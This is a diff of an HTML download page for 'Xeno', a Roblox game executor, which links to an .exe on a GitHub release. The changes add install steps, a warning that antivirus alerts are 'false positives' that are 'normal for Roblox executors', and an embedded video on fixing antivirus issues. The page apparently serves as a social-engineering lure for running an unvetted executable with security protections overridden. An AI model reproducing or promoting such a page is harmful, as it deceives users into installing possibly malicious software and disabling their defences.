@@ -7,56 +7,50 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{min-height:100vh;background:#000000;color:#fff;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 20%,rgba(255,255,255,.4) 0%,transparent 60%);opacity:.35;pointer-events:none;z-index:0}
-.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;gap:32px}
-.brand{display:flex;align-items:center;gap:12px;font-size:15px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.6)}
-.brand-mark{width:36px;height:36px;background:#ffffff;color:#000000;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;box-shadow:0 0 24px rgba(255,255,255,.4)}
-.card{background:#0a0a0a;border:1px solid rgba(255,255,255,.1);border-radius:24px;max-width:480px;width:100%;padding:48px 40px;text-align:center;box-shadow:0 32px 80px rgba(0,0,0,.6)}
-h1{font-size:clamp(28px,4vw,38px);font-weight:900;letter-spacing:-.03em;line-height:1.1;margin-bottom:32px;color:#fff}
-.btn{display:flex;align-items:center;justify-content:center;gap:10px;background:#ffffff;color:#000000;padding:18px 28px;border-radius:14px;text-decoration:none;font-weight:700;font-size:16px;transition:all .2s;box-shadow:0 8px 24px rgba(255,255,255,.4)}
-.btn:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(255,255,255,.4)}
-.btn svg{width:20px;height:20px}
-.pwbox{margin-top:24px;padding:20px;background:#000000;border:1px solid rgba(255,255,255,.1);border-radius:14px;text-align:left;box-shadow:0 8px 24px rgba(0,0,0,.3)}
-.pwlabel{font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.6);margin-bottom:10px;font-weight:600}
-.pwrow{display:flex;align-items:center;gap:12px;justify-content:space-between;flex-wrap:wrap}
-.pwcode{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:22px;font-weight:800;letter-spacing:.15em;color:#ffffff;user-select:all;flex:1;min-width:160px;word-break:break-all;cursor:pointer}
-.pwcopy{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#ffffff;color:#000000;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
-.pwcopy:hover{opacity:.88;transform:translateY(-1px)}
-.pwcopy:active{transform:translateY(0)}
-.pwcopy svg{width:14px;height:14px}
-.pwcopy.copied{background:transparent;color:#ffffff;border:1px solid #ffffff}
-.foot{margin-top:36px;padding-top:24px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;color:rgba(255,255,255,.6);line-height:1.6}
+html,body{min-height:100vh;background:#f0f0f0;color:#333333;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;gap:24px}
+.card{background:#ffffff;border:1px solid #d0d0d0;border-radius:16px;max-width:560px;width:100%;padding:40px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.08)}
+h1{font-size:clamp(24px,4vw,32px);font-weight:800;letter-spacing:-.03em;line-height:1.1;margin-bottom:24px;color:#333333}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:#00a2ff;color:#ffffff;padding:16px 36px;border-radius:10px;text-decoration:none;font-weight:700;font-size:16px;transition:all .2s;box-shadow:0 4px 12px rgba(0,0,0,.1);width:100%;margin-bottom:24px}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.15)}
+.steps{text-align:left;margin-bottom:24px;background:#f8f8f8;border:1px solid #d0d0d0;border-radius:12px;padding:20px}
+.steps h3{font-size:13px;text-transform:uppercase;letter-spacing:.1em;color:#888888;margin-bottom:12px}
+.step{display:flex;align-items:center;gap:12px;font-size:14px;margin-bottom:8px;color:#333333}
+.step-num{width:22px;height:22px;background:#00a2ff;color:#ffffff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:12px;flex-shrink:0}
+.av-warning{background:#fff0f0;border:1px solid #ffcccc;color:#d32f2f;padding:16px;border-radius:12px;font-size:13px;font-weight:600;margin-bottom:24px;text-align:left;line-height:1.5}
+.av-warning strong{display:block;margin-bottom:4px}
+.yt-video{border-radius:12px;overflow:hidden;position:relative;padding-bottom:56.25%;height:0;margin-bottom:20px;border:1px solid #d0d0d0}
+.yt-video iframe{position:absolute;top:0;left:0;width:100%;height:100%}
+.yt-link{display:block;color:#888888;font-size:13px;text-decoration:none;border-bottom:1px dashed #888888;padding-bottom:2px;width:fit-content;margin:0 auto;transition:color .2s}
+.yt-link:hover{color:#00a2ff}
+.foot{margin-top:24px;padding-top:20px;border-top:1px solid #d0d0d0;font-size:12px;color:#888888;line-height:1.6}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <div class="brand"><div class="brand-mark">X</div><span>Xeno</span></div>
   <div class="card">
     <h1>Download Xeno</h1>
-    <a class="btn" href="https://github.com/Thresholdplisky/wave-dl-xeno/releases/download/v-rkyqgk/xeno.exe">
+    <a class="btn" href="https://github.com/Thresholdplisky/wave-dl-xeno/releases/download/v-o011v7/xeno.exe">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
       Download .exe
     </a>
     
-    <div class="foot"> © 2026 Xeno. Not affiliated with Roblox Corporation.</div>
+    <div class="steps">
+      <h3>How to install</h3>
+      <div class="step"><div class="step-num">1</div>Download the file</div>
+      <div class="step"><div class="step-num">2</div>Open the installer</div>
+      <div class="step"><div class="step-num">3</div>Run and follow instructions</div>
+    </div>
+    <div class="av-warning">
+      <strong>Important</strong>
+      Antivirus may flag the file as a false positive. This is normal for Roblox executors. Check the guide below if you need help.
+    </div>
+    <div class="yt-video">
+      <iframe src="https://www.youtube.com/embed/8qWfnsjI4rM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+    <a href="https://www.youtube.com/watch?v=8qWfnsjI4rM" target="_blank" class="yt-link">How to fix antivirus issues on YouTube</a>
+    <div class="foot">© 2026 Xeno. Not affiliated with Roblox Corporation.</div>
   </div>
 </div>
-<script>
-function copyPw(btn){
-  var code=document.getElementById("pwval");
-  if(!code)return;
-  var txt=code.textContent.trim();
-  var done=function(){var orig=btn.innerHTML;btn.innerHTML="✓ Copied";btn.classList.add("copied");setTimeout(function(){btn.innerHTML=orig;btn.classList.remove("copied");},1800);};
-  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(function(){fallbackCopy(txt);done();});}
-  else{fallbackCopy(txt);done();}
-}
-function fallbackCopy(txt){
-  var ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";
-  document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e){}
-  document.body.removeChild(ta);
-}
-document.addEventListener("DOMContentLoaded",function(){var p=document.getElementById("pwval");if(p){p.addEventListener("click",function(){var b=document.querySelector(".pwcopy");if(b)copyPw(b);});}});
-</script>
 </body>
 </html>
